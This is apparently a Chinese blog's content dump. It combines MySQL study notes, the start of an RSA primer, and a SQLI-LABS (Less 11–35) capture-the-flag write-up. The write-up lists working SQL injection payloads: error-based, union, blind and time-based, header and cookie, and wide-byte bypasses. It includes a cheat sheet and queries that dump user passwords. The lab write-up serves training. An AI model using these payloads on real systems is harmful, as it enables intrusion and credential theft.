...\n```\n*fetch*语句是将一行数据赋给一些变量，每次已自动读取到下一行，所以变量名数量必须与*select*语句中的列数相等。\n\n#### 4)关闭游标\n\n```sql\nCLOSE 游标名\n```\n\n**<font face=\"隶书\">example</font>**\n\n```sql\nclose xs_cur2\n```\n\n下面是一些示例：\n\n**<font face=\"隶书\">example</font>**\n\n```sql\ndelimiter $$\ncreate procedure compute (out number integer)\nbegin\n\tdeclare xh char(6);\n\tdeclare found boolean default true;\n\tdeclare number_xs cursor for \n\t\tselect 学号 from xs;\n\tdeclare continue handler for not found\n\t\tset found=false;\n\tset number=0;\n\topen number_xs;\n\tfetch number_xs into xh;\n\twhile found do\n\t\tset number=number+1;\n\t\tfetch number_xs into xh;\n\tend while;\n\tclose number_xs;\nend $$\ndelimiter ;\n```\n\n在MySQL 5.6以后，创建存储过程必须具有**<font face=\"宋体\">CREATE ROUTINE</font>**权限。\n想要查看数据库中哪些存储过程，可以使用 <code>show procedure status</code>命令，要查看具体过程，可以使用 <code>show create procedure 存储过程名</code>命令。\n\n## **存储过程的调用、删除和修改**\n\n### 1、存储过程的调用\n\n存储过程创建完毕后，可以在程序、触发器或者其他存储过程中被调用，一般使用 <font face=\"宋体\">call</font>语句来调用。\n\n语法格式：\n```sql\nCALL 存储过程名 ([参数 ...])\n```\n\n如果要调用某个数据库的存储过程，那么必须先使用这个数据库。\n\n### 2、存储过程的删除\n\n格式\n```sql\nDROP PROCEDURE [IF EXISTS] 存储过程名\n```\n\n### 3、存储过程的修改\n使用**<font face=\"宋体\">alter procedure</font>** 可以修改存储过程的部分特征。\n格式\n```sql\nALTER PROCEDURE 存储过程名 [特征...]\n```\n特征\n```sql\n{contains sql|no sql|reads sql data|modifies sql data}\n|sql security {definer|invoker}\n|comment 'string'\n```\n\n如果想要修改存储过程的内容，可以采用先删除再重新定义存储过程的方法。\n\n# **存储函数**\n\n存储函数和存储过程类似，也是由过程式语句组成的代码片段，但是，也有一些区别：\n> (1)存储函数不能拥有输出参数，因为存储函数本来就是输出参数\n> (2)不能用CALL语句来调用存储函数\n> (3)存储函数必须包含一条RETURN语句，而存储过程中则不得包含。\n\n## 创建存储函数\n\n查看数据库中有哪些存储函数，可以使用命令：\n```sql\nshow function status\n```\n\n创建存储函数\nCREATE FUNCTION语法格式\n```sql\nCREATE FUNCTION 存储过程名 ([参数...])\n\tRETURNS type\n\t[特征...] 主体\n```\n**说明** 存储函数的定义和存储过程相似。\n> 存储函数不能与存储过程同名\n> 存储函数的参数只有名称和类型，不能指定IN,OUT,INOUT。RETURNS type声明函数返回值的数据类型。\n> 主体也叫存储函数体，与存储过程中使用的一样，但是存储函数体必须包含一个 <code>RETURN value</code>,value为存储函数的返回值。\n\n**<font face=\"宋体\">example</font>**\n该例子返回xs表中学生的数目作为结果\n\n```sql\ndelimiter $$\ncreate function num_of_xs()\nreturns integer\nbegin\n\treturn (select count(*) from xs);\nend$$\ndelimiter ;\n```\n\n## **存储函数的调用、删除和修改**\n\n### 1、存储函数的调用\n\n存储函数和MySQL的内置函数(比如version())，所以调用存储函数可以使用 *select* 关键字。\n\n语法格式：\n\n```sql\nSELECT 存储函数名 ([参数[,...]])\n```\n\n存储函数内部也可以调用另外一个存储函数或存储过程\n\n### 2、删除存储函数\n\n语法格式：\n```sql\nDROP FUNCTION [IF EXISTS] 存储过程名\n```\n\n**<font face=\"宋体\">example</font>**\n\n```sql\ndrop function if exists num_of_xs;\n```\n\n### 3、存储函数的修改\n\n```sql\nALTER FUNCTION 存储过程名 [特征 ...]\n```\n\n# **触发器**\n\n触发器不需要被调用，是一个被指定关联到一个表的数据对象，当对一个表的特别事件出现时触发器就会被自动调用。可是实现比如多个表信息的一致性，可通过定义 *delete* 触发器来实现上述功能。\n\n## 创建触发器\n\n想要查看有哪些触发器使用**<font face=\"宋体\">SHOW TRIGGERS</font>** 命令。\n\nCREATE TRIGGER语法格式\n\n```sql\nCREATE TRIGGER 触发器名 触发时刻 触发事件\n\tON 表名 FOR EACH ROW 触发器动作\n```\n\n**说明**\n\n> 触发器名称必须唯一，若要在某个特定数据库中创建，名称前要加上数据库名\n> 触发器时刻，有两个选项：<code>after</code>和<code>before</code>，如果想要在激活之后执行一些语句则可以使用after，如果想要进行验证即可以使用before选项。\t\t\n> 触发器事件：指明了激活触发程序语句的类型。可以是下述值之一\n**<font face=\"宋体\">INSERT</font>** 将新行插入表时激活触发器，例如通过INSERT、LOAD DATA和REPLACE语句。\n**<font face=\"宋体\">UPDATE</font>** 更改某一行时激活触发器。例如UPDATE语句。\n**<font face=\"宋体\">DELETE</font>** 从表中删除某一行时激活触发器。例如，通过DELETE和REPLACE语句。\n> 表名：表示在该表上激活触发程序才会激活触发器，同一个表不能拥有两个具有触发时刻和时间的表，触发时间指*before*和*after*。\n> FOR EACH ROW：这个声明用来指定对于受触发器事件影响的每一行都要激活触发器的动作。\n> 包含触发器激活时将要执行的语句，可使用 *begin-end* 结构来执行多条语句。\n\n注意：触发器不能返回任何数据到客户端，同样也不能调用将数据返回客户端的存储过程。\n\n**<font face=\"宋体\">example</font>**\n\n创建一个表，表中只有一列a，在表上创建一个触发器，每次插入操作时，将用户变量str的值设为“trigger is working”。\n```sql\ncreate table table1(a integer);\ncreate trigger table1_insert after insert\n\ton table1 for each row\n\tset @str='trigger is working';\n```\n向table1中插入一行数据\n```sql\ninsert into table1 values(10);\n```\n查看str的值即可查看触发器是否触发。\n\nMySQL可以关联表中的列，亦可以调用存储过程。在关联表中的列时需要注意：\n> MySQL可以关联表中的任意列，但不能直接使用列的名称作为标志，那会使系统混淆。必须这样描述才可以：**<font face=\"宋体\">NEW.column_name</font>** 或者 **<font face=\"宋体\">OLD.column_name</font>** 。 **<font face=\"宋体\">NEW.column_name</font>**用来引用新行的一列，**<font face=\"宋体\">OLD.column_name</font>** 用来引用更新或删除它之前的已有行的一列。\n对于INSERT语句来说，只有new是合法的，对于DELETE语句，只有OLD才合法，而UPDATE语句可以与OLD和NEW同时使用。\n\n**<font face=\"宋体\">example</font>**\n\n创建一个表实现关联删除的功能\n\n```sql\ndelimiter $$\ncreate trigger xs_delete after delete\n\ton xs for each row\nbegin\n\tdelete from xs_kc where 学号=old.学号；\nend$$\ndelimiter ;\n```\n\n在触发器中也可以调用存储过程。\n\n## 删除触发器\n\n```sql\nDROP TRIGGER [schema_name.]trigger_name\n```\nschema_name为所在数据库的名称\n\n# **事件**\n\n自MySQL5.6之后已经开始支持事件，可能各版本的功能会有所不同，这里是简单的MySQL5.6的版本。\n事件是MySQL在相应的时刻调用的过程式数据库对象。\n\n事件的主要作用如下：\n\n> 关闭账户\n> 打开或关闭数据库指示器\n> 使数据库中的数据在某个间隔后刷新\n> 执行对进入数据的复杂的检查工作。\n\n## 创建事件\n\n语法格式：\n```sql\nCREATE EVENT [IF NOT EXISTS] 事件名\n\tON SCHEDULE schedule\n\t[ON COMPLETION [NOT] PRESERVE]\n\t[ENABLE|DISABLE|DISABLE ON SLAVE]\n\t[COMMENT 'comment']\n\tDO sql语句；\n```\nschedule：\n```sql\nAT timestamp [+INTERVAL interval]\n|EVERT interval\n[STARTS timestamp [+INTERVAL interval]]\n[ENDS timestamp [+INTERVAL interval]]\ninterval:\ncount {YEAR|QUARTER|MONTH|DAY|HOUR|MINUTE|WEEK|SECOND|YEAR_MONTH|DAY_HOUR|DAY_MINUTE|DAY_SECOND|HOUR_MINUTE|HOUR_SECOND|MINUTE_SECOND}\n```\n\n**说明：**\n\nschema：时间调度，表示事件何时发生或每隔多久发生一次。\nAT子句：表示在某个时刻事件发生。timestamp表示一个具体的时间点，后面可以加上一个时间间隔，interval表示这个时间间隔，有一个数字和单位组成，count是间隔时间的数值。\nEVERY子句：表示在指定时间间隔内每隔多长时间事件发生一次，STARTS子句设定开始时间，ENDS子句设定结束时间。\nsql语句：时间执行代码，可以使用begin-end结构\n时间属性：每个事件都可以定义几个属性。\nON COMPLETION NOT PRESERVE表示事件最后执行完之后自动删除该事件，不加NOT表示不删除。默认为有not参数\n\n\nMySQL事件有事件调度器负责调用，打开事件调度器命令为\n```sql\nSET GLOBAL EVENT_SCHEDULER=TRUE;\n```\n\n**<font face=\"宋体\">example</font>**\n创建一个30秒后启动的事件\n\n```sql\nuse xscj\ncreate event afterseconds\n\ton schedule at now()+interval 30 second\n\tdo insert into xs values('091103','张建');\n```\n\n## 修改和删除事件\n\n修改事件\n```sql\nALTER EVENT event_name\n\t[ON SCHEDULE schedule]\n\t[ON COMPLETION [NOT] PRESERVE]\n\t[RENAME TO new_event_name]\n\t[ENABLE|DISABLE|DISABLE ON SLAVE]\n```\n\n删除事件\n```sql\nDROP EVENT [IF EXISTS] [database name.] event name\n```\n","tags":["SQL"],"categories":["资料"]},{"title":"SQLI-LABS(Less11-Less35)","url":"/2018/02/09/sqli-labs2/","content":"\n接上篇\n\n<!--more-->\n\n# LESS-11\n\n有回显，尝试报错注入\n```sql\nusernae = admin'and 1=(updatexml(1,concat(0x3a,(select database())),1))#\npassword = admin'and 1=(updatexml(1,concat(0x3a,(select database())),1))#\n```\n\n发现有回显\n\n> XPATH syntax error: ':security'\n\n则可以得到数据库名。\n\n------------\n\n常用报错语句\n\n1、通过floor报错,注入语句如下:\n```sql\nand select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n```\n\n2、通过ExtractValue报错,注入语句如下:\n```sql\nand extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));\n```\n\n3、通过UpdateXml报错,注入语句如下:\n```sql\nand 1=(updatexml(1,concat(0x3a,(select user())),1))\n```\n\n4、通过NAME_CONST报错,注入语句如下:\n```\nand exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)\n```\n\n5、通过join报错,注入语句如下:\n```\nselect * from(select * from mysql.user ajoin mysql.user b)c;\n```\n\n6、通过exp报错,注入语句如下:\n```\nand exp(~(select * from (select user () ) a) );\n```\n\n7、通过GeometryCollection()报错,注入语句如下:\n```\nand GeometryCollection(()select *from(select user () )a)b );\n```\n\n8、通过polygon ()报错,注入语句如下:\n```\nand polygon (()select * from(select user ())a)b );\n```\n\n9、通过multipoint ()报错,注入语句如下:\n```\nand multipoint (()select * from(select user() )a)b );\n```\n\n10、通过multlinestring ()报错,注入语句如下:\n```\nand multlinestring (()select * from(selectuser () )a)b );\n```\n\n11、通过multpolygon ()报错,注入语句如下:\n```\nand multpolygon (()select * from(selectuser () )a)b );\n```\n\n12、通过linestring ()报错,注入语句如下:\n```\nand linestring (()select * from(select user() )a)b );\n```\n\n---------------\n\n还有其他方法\n\n```sql\nuname=1admin' union select 1,database()#&passwd=1\n```\n这样可以得到数据库名\n继续爆表\n\n```sql\nuname=admin45' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'#&passwd=1\n```\n可以得到\n\n> Your Password:emails,referers,uagents,users\n爆字段\n\n```sql\nuname=admin45' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#&passwd=1\n```\n\n> Your Password:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password\n爆内容\n\n```sql\nuname=admin45' union select 1,concat_ws(password) from users#&passwd=1\n```\n\n# LESS-12\n\n构造闭合语句\n```sql\nuname=admin\") or 1=1 limit 0,1#&passwd=1\n```\n\n后面和11关一样\n\n# LESS-13\n\n尝试 `uname=admin'&passwd=1`,返回错误信息\n\n> near '1') LIMIT 0,1' at line 1\n\n构造闭合语句\n```sql\nuname=admin')#&passwd=1\n```\n可以成功登陆，但是无法和前面一样显示信息，故得使用盲注\n```sql\nuname=admin') and left(database(),1)='s'#&passwd=1\n```\n然后一步步可以得到所有信息\n\n# LESS-14\n\n直接换双引号闭合\n```sql\nuname=admin\" or 1=1#&passwd=1\n```\n\n# LESS-15\n\n单引号闭合即可\n```sql\nuname=admin\" or 1=1#&passwd=1\n```\n\n也可以延时注入\n```sql\nuname=admin' and if(ascii(substr(database(),1,1))=119,1,sleep(5))#&passwd=admin\n```\n\n# LESS-16\n\npayload\n```sql\nuname=admin\") or 1=1#&passwd=1\n```\n\n# LESS-17\n\n本关是一个涉及数据库的增删查改的问题，发现对数据库的username输入进行了过滤，但是对password没有过滤。\n报错注入payload\n```sql\nuname=admin&passwd=11'and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&submit=Submit\n```\n也可以延时注入，但是延时注入会修改数据库内容，不建议使用。\n\n接下来三关是对header头的注入\n# LESS-18\n\n截取Header头进行修改，由于username和password参数都进行了检查，故无法从这两个地方注入。\n修改User-Agent，利用报错进行注入\npayload\n```sql\n' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1\n```\n\n这个在本题不可以用，但是可以报错，\n```sql\nextractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))\n```\n\n# LESS-19\n\n只是将注入位置换为referer即可\n\n# LESS-20\n\n用cookie注入,这里我用的是火狐的Cookie Manager插件\n```sql\nDumb' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#\n```\n然后可以继续注入获取全部内容。\n\n# LESS-21\n\n本题与20题方法一样，只是闭合方法不同，还有要对payload进行base64编码。\n```sql\nDumb') and updatexml(1,concat(0x7e,(select @@version),0x7e),1)#\n```\n再用base64编码\n```\nRHVtYicpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkpLDB4N2UpLDEpIw%3d%3d\n```\n\n# LESS-22\n\n与21关相同只是闭合方式变成了双引号\n```\nRHVtYiIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgQEB2ZXJzaW9uKSwweDdlKSwxKSM%3d\n```\n\n# LESS-23\n\n此题过滤了--和#注释符，构造payload闭合 `?id=1' and 'a'='a`，继续获取文件路径\n```\n?id=-1' union select 1,@@datadir,'a\n```\n获取表名\n```\n?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),'a\n```\n下面的不再演示，还可以报错注入，延时注入等\n```\n?id=-1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and 'a'='a\n```\n延时注入\n```\n?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(5)) and 'a'='a\n```\n\n# LESS-24\n\n本关看界面是用户创建密和修改密码等，考察的是二次排序注入(又叫存储型注入)。\n先创建一个用户`admin'#`，如果修改密码，则会将admin用户的密码修改。SQL语句就变为\n```sql\nupdate users set paddwd='new_pass' where username='admin'#' and password='\n```\n相当于执行了`update users set password='$new_pass' where username='admin'`，从而更改了用户名。\n\n# LESS-25\n\n单引号闭合联合注入\n```sql\n?id=-1' union select 1,database(),'a\n```\n本题要绕过and和or，有常用的几个方法\n> (1)大小写变形，如Or,oR,OR\n> (2)编码，hex,urlencode\n> (3)添加注释/\\*or\\*/\n> (4)利用符号 and=&& ,or=||\n> (5)重复输入anandd\n\n利用方法4\n```sql\n?id=1' || updatexml(1,concat(0x7e,(select @@version),0x7e),1) || '1'='1\n```\n\n# LESS-25a\n\n本关没有错误回显，所以不能用报错注入。并没有引号限制，可以联合注入\n```\n?id=-1 union select 1,database(),3#\n```\n\n# LESS-26\n\n由于空格注释符等都被过滤掉了，其他的符号Windows下不能用，可以用不带空格的报错注入。\n```sql\n?id=0'||extractvalue(1, concat(0x5c, (database())))||'1'='1\n```\n\n然后继续注入\n```\n?id=1'||extractvalue(1,concat(0x5c,(select(group_concat(username))from(users))))||'1'='1\n```\n\n对于空格常用的方法为：\n\n|编码|含义|\n|:-:|:-:|\n|%09|TAB键(水平)|\n|%0a|新建一行|\n|%0c|新的一页|\n|%0d|return功能|\n|%0b|TAB键(垂直)|\n|%a0|空格|\n\n# LESS-26a\n\n本关无法回显错误，无法使用报错注入，还有闭合方式为 `?id=1')`\n盲注payload：\n```\n?id=1'anandd(select(substr((select(database())),1,1)))='s\n```\n联合注入\n```\n?id=555')union(select(1),(user()),'1\n```\n爆用户名\n```\n?id=555')union(select(1),group_concat(username),(2)from(users)where(1=1))union(select(1),(2),'a\n```\n\n# LESS-27\n本题过滤了select和上关的字符，可以大小写混合绕过\n报错注入payload\n```\n?id=0'||extractvalue(1, concat(0x5c, (seleCt(group_concat(table_name))from(information_schema.tables)where(table_schema)=database())))||'1'='1\n```\n\n# LESS-27a\n\n本题双引号闭合，无法报错。盲注payload：\n```\n?id=0\"||(SelEct(substr((SelecT(database())),1,1)))=\"s\n```\n\n# LESS-28\n\n与前面没有太大区别，盲注payload\n```\n?id=888')||(SelecT(substr((SelEct(database())),1,1)))=('s\n```\n\n联合注入\n```\n?id=888')unIon(Select(1),database(),'a\n```\n\n# LESS-28a\n\n本题知识简单过滤了union等符号，联合注入\n```\n?id=555')unIon(SeLect 1,database(),'3\n```\n\n# LESS-29\n\n注意：本题的index.php页面没有任何防护，注册页面是在login.php页面\n\n在login.php文件中，传入的参数会被分为两组，分组符号为&，那么构造payload，以&分组即可\n```\n?id=1&id=-1' union select 1,group_concat(username),2 from users--+\n```\n本关为HPP(http参数污染)攻击,具体参见百度\n\n# LESS-30\n\n与29关相同，只是闭合方式改为`\"`\n```\n?id=1&id=-1\" union select 1,group_concat(username),2 from users--+\n```\n\n# LESS-31\n\n与前面的相同，只是闭合方式变了\n```\n?id=1&id=-2\") union select 1,database(),3--+\n```\n\n-------------\n# 宽字节注入\n\n原理：\n> mysql在使用GBK编码的时候，会把两个字符作为一个汉字，例如%aa%5c就是一个汉字(前一个ascii码大于128才能到汉字的范围)。我们在过滤`'`的时候，往往利用的思路是将**`\\'`**，因此我们的思路就是将'前面的\\换掉。\n\n方法一般有两种：\n> 1、%df吃掉\\\\，具体的原因是urlencode(\\\\')=%5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面的提到的mysql在GBK编码的时候两个字节当做一个汉字，此时%df%5c就是一个汉字，那么%27单独在外面，达到了我们的目的。\n> 2、将`%\\*\\*%5c%5c%27`的情况，后面%5c会被前面的%5c给注释掉\n\n-------------\n\n# LESS-32\n\n用第一种方法绕过\n```\n?id=-1%df%27union%20select%201,user(),3--+\n```\n这个payload执行的sql语句是\n```\nselect 1,2,3 from users where id='-1運'union select 1,user(),3;\n```\n\n# LESS-33\n\n这个和上一题没什么区别，同样的payload也可以用\n```\n?id=-1%df%27union select 1,2,@@basedir--+\n```\n\n# LESS-34\n\n本关是post型的注入漏洞，同样也是进行了`♦'`，我们利用这个方式尝试。payload\n```\nuname=♦' or 1=1#&passwd=1&submit=Submit\n```\n\n继续的话可以\n```\nuname=♦' union select 2,@@basedir#&passwd=1&submit=Submit\n```\n\n# LESS-35\n\n本关和前面的过滤一样，只是没有加引号闭合，所以就更简单了\n```\n?id=-1 union select 1,database(),3#\n```\n在后面的时候有个数字型注入，编码绕过即可\n```\n?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273--+\n```\n\n","tags":["SQL注入"],"categories":["writeup"]},{"title":"MySQL学习笔记(五)","url":"/2018/02/07/mysql5/","content":"\nMySQL语言结构\n<!--more-->\n\n# **MySQL语言简介**\n\n在MySQL数据库中，SQL语言有以下四部分组成\n\n(1)数据定义语言(Data Definition Language,DDL)，用于执行的对数据库的操作，例如 <code>create</code>、 <code>alter</code>等。\n(2)数据操纵语言(Data Manipulation Language,DML),用于操纵数据库，比如 <code>select</code>、 <code>insert</code>等。\n(3)数据控制语言(Data Control Language),比如授予和收回权限 <code>grant</code> 和 <code>revoke</code>\n(4)MySQL增加的语言元素，比如变量常量等。\n\n# **部分常量值**\n\n## **十六进制常量**\n\n十六进制常量通常被当做字符串来存储，在字符串前面加一个x或者X，注意数字不能超出16进制的范围，如果在前面几加0x的话就不需要加引号了，十六进制默认作为字符串来处理，如果想作为数字处理的话，使用 *CAST(... AS UNSIGNED)* 语句，比如 <code>select 0x41,cast(0x41 as unsigned);</code>, <code>HEX()</code>函数可将字符串转换为十六进制。\n\n## **位字段值**\n\n一般使用b'value'来表示二进制值。 <code>BIN()</code>可以把位字段常量转为二进制显示， <code>OCT()</code>转为数字显示。\n\n# **变量**\n\n## **用户变量**\n\n语法格式\n\n```\nset @user_variables1=expression1[,user_variables2=expression2...]\n```\n\n## **系统变量**\n\n分为全局变量(GLOBAL)和局部变量(LOCAL &#124; SESSION)\n\n\n# **常用函数**\n\n## 1、数学函数(数学函数支持嵌套使用)\n\n### 1、*great()* 和 *least()函数*： 获取一组数中的最大值和最小值\n```sql\ngreat(1,2,3)-->3     least(1,2,3)-->1\n```\n\n注意：MySQL中函数名与括号之间不能有空格\n\n### 2、 *floor()* 和 *ceiling()* 函数\n\n> *floor()* 函数用于获得小于一个整数的最大整数值，*ceiling* 用于获得大于一个整数的最小整数值。\n\n### 3、 *round()* 和 *truncate()* \n\n> *round()* 用于获得一个数的四舍五入的整数值。\n\n> *truncate(a,b)* 用于把一个数字a截取为一个指定小数位数b的数字\n\n```\ntruncate(1.54578,2)-->1.54\n```\n\n### 4、 *abs()* 函数\n\n> 获取绝对值\n\n### 5、 *sign()* 函数\n\n> 返回数字的符号，返回的结果是正数(1)，负数(-1)、或者零(0)\n\n### 6、 *sqrt()* 函数\n\n> 返回平方根\n\n### 7、 *pow()* 函数\n\n> pow(a,b)--> a^b\n\n### 8、 *bin()* 、 *otc()* 、 *hex()* 函数\n\n> 分别返回一个数的二进制、八进制和十六进制值，作为字符串返回\n\n## 2、聚合函数\n\n比如 *count()*, *sum()* 等\n\n## 3、字符串函数\n\n### 1、 *ascii(char)* 函数\n\n> 返回字符表达式最左端字符的ASCII值，返回值为整型\n\n### 2、 *char()* 函数\n\n```\nchar(x1,x2,x3,...)\n```\n\n> 将x1,x2,x3的ascii码转换为字符，组成一个字符串。\n\n### 3、 *left()* 和 *right* 函数\n\n<code>left&#124;right (str,x)</code> 返回字符串str左边或右边的前x个字符\n\n### 4、 *trim* 和 *ltrim* 和 *rtrim* 函数\n\n```\ntrim|ltrim|rtrim(str)\n```\n\n> *ltrim* 和 *rtrim* 分别删除字符串左边和右边的空格，*trim* 则删除左右两边的空格。\n\n### 5、 *rpad()* 和 *lpad* 函数\n\n```sql\nrpad|lpad(str,n,pad)\n```\n\n> 用字符串pad对字符串str左边后右边进行填充，直到str的字符数目得到n个，若str的字符个数大于n，则返回前n个字符\n\n### 6、 *replace(str1,str2,str3)* 函数\n\n> 用字符串str3替换str1中所有出现的字符串str2。\n\n### 7、 *concat(s1,s2,s3,...)*\n\n> 字符串连接函数\n\n### 8、 *substring(expr,start,length)*\n\n> 返回指定长度的子串\n\n### 9、 *strcmp(s1,s2)*\n\n> 字符串比较函数\n\n## 4、 类型转换函数\n\n```\ncast(expr,AS type)\n```\n\n> expr是要转化的值，type是转换后的数据类型，类型有*binary* , *char* , *date* , *date* , *time* , *datetime* , *signed* , *unsigned* 。\n\n## 5、 控制流函数\n\n### 1、 *ifnull()* 和 *nullif()* 函数\n\n```\nifnull(expr1,expr2) \n```\n\n> 判断参数expr1是否为null，如果expr1为null，则返回expr2，否则返回expr1。\n\n```\nnullif(expr1,expr2)\n```\n\n> 判断两个参数是否相等，如果相等返回null，否则返回第一个参数。\n\n### 2、 *if()* 函数\n\n```\nif(expr1,expr2,expr3)\n```\n\n> 函数会判断expr1是否为真，如果表达式为真则返回第二个参数，如果为假返回第三个参数。\n\n","tags":["SQL"],"categories":["资料"]},{"title":"MySQL学习笔记(四)","url":"/2018/02/03/MySql4/","content":"# 前言\n\n本次学习内容为MySQL索引与完整性约束，MySQL索引类似于书本的目录，是为了方便地找到要查找的数据。而完整性约束是指对数据的输入合法性等进行完整性约束检查。\n<!--more-->\n\n# MySQL索引\n\n## 索引及其作用\n\nMySQL索引的存储方式是另外存储一个文件来保存索引值，查找时通过索引定位到行的位置从而快速的查找数据。MySQL索引可以由最多15个列组成，*最大索引长度* 是<code>256</code>字节。\n\n## 索引的分类\n\n由于索引是保存在文件中的，所以是要占据磁盘空间的，MySQL中一个表的索引都保存在一个索引文件夹中，如果增加删除或者更新表的一行，那么MySQL也会自动的更新索引，保证索引和表中的内容保持一致。\n\n1、 BTREE索引\n\n普通索引(INDEX)\n\n> 这是最基本的索引，没有唯一性约束，\n\n唯一性索引(UNIQUE)\n\n> 唯一性索引，即每一列的索引值都只能出现一次，必须是唯一的。\n\n主键(PRIMARY KEY)\n\n> 主键索引，拥有唯一性索引的特点，但是一个表只能有一个主键。既可以在创建的时候指定，也可以通过修改表的方式加入主键。\n\n全文索引(FULLTEXT)\n\n> 全文索引只能在 *VARCHAR* 或者 *TEXT* 类型中使用，并且只能在MyISAM中创建。对于大规模数据集来说，通过 <code>alter table</code>或者 <code>create index</code>命令创建会更快一些。\n\n2、 哈希索引(HASH)\n\n当表类型为MEMORY或者HEAP时，MySQL还支持HASH索引，当根据一个值获取特定行时，哈希索引非常快。\n\n# MySQL索引创建\n\n## create index\n\n```sql\ncreate [unique | fulltext | spatial] index 索引名\n\t[索引类型]\n\ton 表名 (索引列名,)\n\t[索引选项] ...\n索引列名=:\n\t列名 [(长度)] [asc | desc]\n```\n\n说明\n\n> spatial为空间索引\n> 索引类型包括BTREE和HASH\n> <code>create index</code>不能创建 *主键* \n> 索引列名，创建索引列名后的长度表示该列前面创建索引字符个数，这可以节省磁盘空间。\n\n**举例**\n\n根据sx表的学号列上的前5个字符建立一个升序索引xh_xs\n\n```sql\ncreate index xh_xs\n\ton xs(学号(5) asc);\n```\n\n## alter table创建\n\n略\n\n## 建表时创建索引\n\n略\n\n## 删除索引\n\n```sql\ndrop index 索引名 on 表名\n```\n\n或者\n\n```sql\nalter [ignore] table 表名\n...\n|drop primary key              # 删除主键\n|drop {index|key} 索引名       # 删除索引\n|drop foreign key fk_symbo     # 删除外键\n```\n\n# CHECK完整性约束\n\n**语法格式**\n\n```sql\ncheck(expr)\n```\n\n**举例**\n\n```sql\ncreate table student\n(\n\t学号  char(6) not null,\n\t性别 char(1) not null\n\t\tcheck(性别 in ('男','女'))\n\n)；\n```\n","tags":["SQL"],"categories":["资料"]},{"title":"RSA算法初探","url":"/2018/01/29/RSA初探/","content":"#### 前言  ####\n\n不得不承认我的数学真的是灰常灰常渣，研究了好久才差不多弄明白，真的感觉又被数学虐了o(╥﹏╥)o，不过打比赛需要掌握，咬着牙也得弄明白呀。\n<!--more-->\n\n#### 正文 ####\n\n我看许多的介绍文章都是先讲一大堆的数学公式然后再开始介绍RSA，给我一顿绕啊，愣是不知道在干什么，所以我想先介绍RSA，过程中需要什么数学理论再用什么理论，这样对于数学渣渣会友好一些。\n\n**RSA介绍**\n\nRSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。\nRSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种*非对称加密算法*。\n今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战和质疑。\nRSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。\n一句话，*RSA是目前最重要的网络加密算法。*\n\n**RSA密钥生成**\n\n第一步\n\n> 选定两个质数p、q，实际应用中这两个数越大安全性越高。\n\n第二步\n\n> 计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是*密钥长度*，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。\n\n第三步\n\n> 计算n的 *欧拉函数* φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表\n\n第四步\n \n>  随机选定一个数e1，要求1 < e1 < φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击[这里](https://baike.baidu.com/item/%E4%BA%92%E8%B4%A8)\n\n第五步\n\n> 寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用*扩展欧几里得算法* 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。\n\n第六步\n\n> 封装*（n，e1）*为*公钥* ，*（n，e2）*为*私钥*。\n\n至此，所有准备工作完成。\n\n\n----------\n\n**加密和解密**\n\n>  先介绍一下加解密的公式，假定明文为A，那么，\n>  密文B≡A^e1 mod n，要传输给对方的就是B\n>  对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。\n\n假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(*^▽^*)。\n\n>  假定要传输的明文为： 32 \n>   注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode      编码传输。\n\n加密\n\n> A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密\n\n解密\n\n> A = B^e2 mod n = 32 ，成功得到明文32！\n\n\n----------\n\n**RSA破解**\n\n所谓兵来将挡水来土掩，有人搞出来加密算法，就有人想搞出来破解算法，那么想要破解RSA能做到吗？我们不妨来看一下我们在整个过程中都用到了那些数据\n\n> 